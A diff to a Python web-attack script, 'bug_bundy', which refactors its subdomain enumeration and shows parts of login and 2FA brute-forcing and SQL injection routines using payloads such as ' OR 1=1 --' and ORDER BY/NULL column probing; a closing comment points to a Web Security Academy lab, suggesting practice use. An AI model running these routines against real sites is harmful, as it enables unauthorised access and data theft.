@@ -14,25 +14,23 @@ def bug_bundy():
     print(" ██████   ██████   ██████      ██████   ██████   ██████  ██   ████    ██       ██    ")
     print("\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t by Tom Thomas")
     print("\n")
-    
 def subdomains():
     url=input("Enter the URL without http:// or https:// ")
     subfile=input("Enter the path of wordlist ")
     fd=open(subfile,"r")
     subs=fd.read()
-    subdomain=list(subs.split("\n"))
-    for i in subdomain:
-        url2="https://{}.{}".format(i,url)
-        header2={
-            "Host":"https://{}.{}".format(i,url)
-        }
+    subdoms=list(subs.split("\n"))
+    for sub in subdoms:
+        sub_domains = f"http://{sub}.{url}"
+
         try:
-            r = requests.get(url2,headers=header2)
-            if r.status_code!=404 and len(r.text>0):
-                print(url2)
-        except:
+            requests.get(sub_domains)
+
+        except requests.ConnectionError:
             pass
 
+        else:
+            print("Valid domain: ", sub_domains)
 def bruteforce_via_different_responses(usernames, passwords, url):
     username = None
     for i in usernames:
@@ -176,7 +174,6 @@ def two_FA_broken_logic(url):
         if "Incorrect security code" not in r.text:
             print(i)
             break
-            
 def Broken_Authentication():
     while True:
         print("\n")
@@ -223,7 +220,6 @@ def Broken_Authentication():
             two_FA_broken_logic(url)
         else:
             break
-            
 def replaceNth(s, source, target, n) :
     inds = [i for i in range(len(s)-len(source)+1) if s[i:i+len(source)]==source]
     if len (inds)< n:
@@ -231,7 +227,6 @@ def replaceNth(s, source, target, n) :
     s = list(s)
     s[inds[n-1]: inds [n-1]+len(source)] = target
     return ''.join(s)
-    
 def SQl_injection_retrieval_of_hidden_data(url):
     OR = ["' OR 1=1 -- ","' OR '1'='1 -- "]
     ORDERby = ["' ORDER BY "]
@@ -249,7 +244,6 @@ def SQl_injection_retrieval_of_hidden_data(url):
         else:
             print("Total Number of columns are {} ".format(i-1))
             return i
-            
     print("Trying number of columns with NULL ...")
     for i in range(1, 50):
         query = "NULL," * i
@@ -273,6 +267,7 @@ def SQl_injection_retrieval_of_hidden_data(url):
 
 def SQL_injection():
     while True:
+
         print("\n")
         print("Options:")
         print("\n")
@@ -304,7 +299,6 @@ def main():
             SQL_injection()
         else:
             break
-            
 if __name__ == "__main__":
     main()
 #https://0a0300ff041ad69c85a41ce500f8000c.web-security-academy.net/login
